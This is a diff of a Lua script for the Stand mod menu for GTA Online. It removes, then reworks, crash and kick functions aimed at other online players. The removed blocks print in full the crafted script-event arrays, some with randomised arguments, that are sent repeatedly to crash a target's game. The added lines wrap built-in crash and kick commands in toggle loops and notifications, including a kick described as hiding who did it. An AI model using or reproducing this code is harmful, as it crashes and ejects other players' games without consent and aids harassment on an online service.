-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
-            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
-        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
-        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    	notification("Skid Crash " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
-
-    	menu.toggle_loop(skidpowcrash, "Skid Crash", {"toggleskidpow"}, "Skidded from 2take1 code crashes modders woop woop.", function(on_toggle)
-    	notification("Skid Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
-            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
-        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
-        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
-        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    	notification("Skid Crashed " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
-
-
-
-    local automobcrash = menu.list(crash, "Automobile Crash", {}, "")
-
-    	menu.action(automobcrash, "Automobile Crash", {"automob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function()
-    	notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    	notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
-
-    	menu.toggle_loop(automobcrash, "Automobile Crash", {"toggleautomob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function(on_toggle)
-    	notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-        		local int_min = -2147483647
-        		local int_max = 2147483647
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        			util.yield()
-        			for i = 1, 15 do
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-        			end
-        	menu.trigger_commands("givesh" .. players.get_name(pid))
-        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
-    	notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
-    			end)
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -12277,56 +12035,63 @@ local function random_args(id, amount)
     end
 end
 
-	menu.divider(crash, "Stand Crash Loops")
 
     	local standcrash = menu.list(crash, "Stand Crash Loops", {}, "")
 
 	menu.divider(standcrash, "Stand Crash Loops")
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Elegant", {"crash"}, "Blocked by most menus.", function()
+        menu.toggle_loop(standcrash, "Elegant", {"togglecrash"}, "Blocked by most menus.", function()
+            notification("Elegant sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("crash" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Irresponsible Disclosure", {"smash"}, "Note: Use Panic Mode.", function(on_loop)
+        menu.toggle_loop(standcrash, "Irresponsible Disclosure", {"togglesmash"}, "Note: Use Panic Mode.", function(on_loop)
+            notification("Irresponsible Disclosure sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("smash" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "BDSM", {"choke"}, "Blocked by popular menus.", function(on_loop)
+        menu.toggle_loop(standcrash, "BDSM", {"togglechoke"}, "Blocked by popular menus.", function(on_loop)
+            notification("BDSM sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("choke" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Indecent Exposure", {"flashcrash"}, "Blocked by popular menus.", function(on_loop)
+        menu.toggle_loop(standcrash, "Indecent Exposure", {"toggleflashcrash"}, "Blocked by popular menus.", function(on_loop)
+            notification("Indecent Exposure sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("flashcrash" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Next-Gen", {"ngcrash"}, "Blocked by popular menus.", function(on_loop)
+        menu.toggle_loop(standcrash, "Next-Gen", {"togglengcrash"}, "Blocked by popular menus.", function(on_loop)
+            notification("Next-Gen sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("ngcrash" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Steamroller", {"steamroll"}, "Note: This crash will also affect other players close to your target.", function(on_loop)
+        menu.toggle_loop(standcrash, "Steamroller", {"togglesteamroll"}, "Note: This crash will also affect other players close to your target.", function(on_loop)
+            notification("Steamroller sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("steamroll" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Burger King Foot Lettuce", {"footlettuce"}, "Can't be blocked without consequences, but the target might karma you for using it.", function(on_loop)
+        menu.toggle_loop(standcrash, "Burger King Foot Lettuce", {"togglefootlettuce"}, "Can't be blocked without consequences, but the target might karma you for using it.", function(on_loop)
+            notification("Burger King Foot Lettuce sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("footlettuce" .. players.get_name(pid))
         end)
     end
 
     if menu.get_edition() >= 2 then 
-        menu.toggle_loop(standcrash, "Vehicular Manslaughter", {"slaughter"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function(on_loop)
+        menu.toggle_loop(standcrash, "Vehicular Manslaughter", {"toggleslaughter"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function(on_loop)
+            notification("Vehicular Manslaughter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
             menu.trigger_commands("slaughter" .. players.get_name(pid))
         end)
     end
@@ -13918,6 +13683,15 @@ menu.toggle_loop(misc, "Accept Joins", {}, "Automatically accept join screens", 
     if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
         PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
         util.yield(200)
+    end
+end)
+
+menu.toggle(misc, "Stand User Identification", {}, "Identifies other Stand users but also allows them to identify you.", function(on_toggle)
+    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
+    if on_toggle then
+        menu.trigger_command(standid, "on")
+    else
+        menu.trigger_command(standid, "off")
     end
 end)
 
